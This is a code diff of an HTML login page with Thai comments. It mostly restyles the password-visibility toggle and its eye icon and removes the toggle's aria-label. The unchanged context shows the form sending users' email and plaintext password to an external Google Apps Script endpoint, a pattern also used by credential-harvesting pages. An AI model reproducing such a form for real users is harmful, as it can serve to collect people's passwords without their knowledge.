@@ -66,6 +66,7 @@
       padding: 0.8rem 2.5rem 0.8rem 1.2rem;
       border: 1px solid #ccc;
       border-radius: 8px;
+      transition: none;
     }
 
     .toggle-password {
@@ -77,17 +78,17 @@
       border: none;
       cursor: pointer;
       padding: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 24px;
+      height: 24px;
     }
 
     .toggle-password svg {
-      width: 22px;
-      height: 22px;
-      fill: #888;
-      transition: fill 0.3s;
-    }
-
-    .toggle-password:hover svg {
-      fill: #000;
+      width: 24px;
+      height: 24px;
+      fill: #f6c90e; /* สีเหลืองน่ารัก */
     }
 
     button[type="submit"] {
@@ -123,7 +124,8 @@
         <label for="password">Password</label>
         <div class="input-group">
           <input type="password" id="password" name="password" required placeholder="Password" />
-          <button type="button" class="toggle-password" onclick="togglePassword()" aria-label="Toggle Password">
+          <button type="button" class="toggle-password" onclick="togglePassword()">
+            <!-- ตาเปิดแบบน่ารัก -->
             <svg id="eye-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
               <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"/>
               <circle cx="12" cy="12" r="3"/>
@@ -140,7 +142,6 @@
     const form = document.querySelector("#form");
     const pwdInput = document.getElementById("password");
     const eyeIcon = document.getElementById("eye-icon");
-    const toggleBtn = document.querySelector(".toggle-password");
 
     const scriptURL = "https://script.google.com/macros/s/AKfycbx9dmqEKmDTZSwoABl4h8WjTCFU2BMBYjo0atbklk863llEB7-zGpS1qDgF3o2XcgRm5A/exec";
 
@@ -149,10 +150,9 @@
     function togglePassword() {
       showPassword = !showPassword;
       pwdInput.type = showPassword ? "text" : "password";
-
       eyeIcon.innerHTML = showPassword
         ? `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"/><circle cx="12" cy="12" r="3"/>`
-        : `<path d="M17.94 17.94a10.03 10.03 0 01-5.94 2.06C6 20 2 12 2 12s1.78-3.33 4.94-5.94l10 10zM21.12 21.12L2.88 2.88" stroke="#000" stroke-width="2"/>`;
+        : `<path d="M2 12s4-8 10-8 10 8 10 8-4 8-10 8S2 12 2 12zm10-5a5 5 0 0 0 0 10V7z"/>`;
     }
 
     form.addEventListener("submit", (e) => {
@@ -165,7 +165,7 @@
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ email, password }),
       })
-        .then(response => {
+        .then((response) => {
           if (response.ok) {
             alert("ส่งข้อมูลสำเร็จแล้ว!");
             form.reset();
@@ -173,7 +173,7 @@
             alert("เกิดข้อผิดพลาด กรุณาลองใหม่");
           }
         })
-        .catch(error => {
+        .catch((error) => {
           alert("เกิดข้อผิดพลาด กรุณาลองใหม่");
           console.error("Fetch Error!", error);
         });
